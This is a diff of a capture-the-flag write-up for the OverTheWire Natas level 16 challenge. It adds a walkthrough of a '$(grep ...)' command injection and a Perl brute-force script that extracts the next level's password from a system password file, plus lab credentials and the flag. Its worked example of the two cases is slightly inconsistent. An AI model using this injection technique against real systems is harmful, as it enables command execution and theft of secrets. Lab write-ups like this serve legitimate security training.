@@ -368,7 +368,7 @@ After a few minutes of bruteforcing, we get:
 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 ```
 
-## 16 Yet another grep injection
+## 16 First nightmare - 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 
 This is similar to previous challenges, but with extra character filters and now they wrap `$key` in double quotes.
 
@@ -395,3 +395,83 @@ grep -i ".*" /etc/natas_webpass/natas17 "foo" dictionary.txt
 ```
 
 NOPE, we can't send double quotes...
+
+Ok, so I cheated a bit and saw that this is another case for bruteforcing and the idea is to think in reverse: try and get the grep not to match when you actually match something.
+
+So, since we can pass `$` and `()`, we can run commands inside that other grep like so:
+
+```php
+$key = "$(grep ^a /etc/natas_webpass/natas17)"
+```
+
+It turns the executed command into:
+
+```bash
+grep -i "$(grep ^a /etc/natas_webpass/natas17)"elephant dictionary.txt
+```
+
+If `/etc/natas_webpass/natas17` matches `/^a/` then the resulting command will be:
+
+```bash
+grep -i "aelephant" dictionary.txt
+```
+
+And if it does not begin with an `a` then it will not match, will be empty and the command will be
+
+```bash
+grep -i "aelephant" dictionary.txt
+```
+
+Which we know will match cause we know:
+
+1. `elephant` is on the dictionary.
+2. `alephant` is not.
+
+So, to the batmobile!
+
+```perl
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use v5.10;
+use LWP::UserAgent;
+use HTTP::Request::Common;
+
+my $url = 'http://natas16.natas.labs.overthewire.org/index.php';
+my $ua = LWP::UserAgent->new();
+
+
+my $flag_found = 0;
+my $flag = '';
+my @possible_characters = split('', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
+
+while (!$flag_found) {
+	for(my $char_index = 0; $char_index < @possible_characters; $char_index++) {
+		my $char = $possible_characters[$char_index];
+		my $temp_flag = $flag . $char;
+		my $payload = "\$(grep ^$temp_flag /etc/natas_webpass/natas17)elephant";
+
+		print "Attempting $temp_flag\n";
+
+		my $request = POST $url, Content => [ needle =>  $payload ];
+		 
+		$request->authorization_basic('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh');
+		 
+		my $response = $ua->request($request);
+		if ($response->as_string() !~ /elephant/i) {
+			$flag .= $char;
+			print "Got part of flag as $flag                   \n";
+			last;
+		}
+	}
+
+	if (length($flag) == 32) {
+		$flag_found = 1;
+	}
+}
+
+say $flag;
+```
+
+Alas, the flag is: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
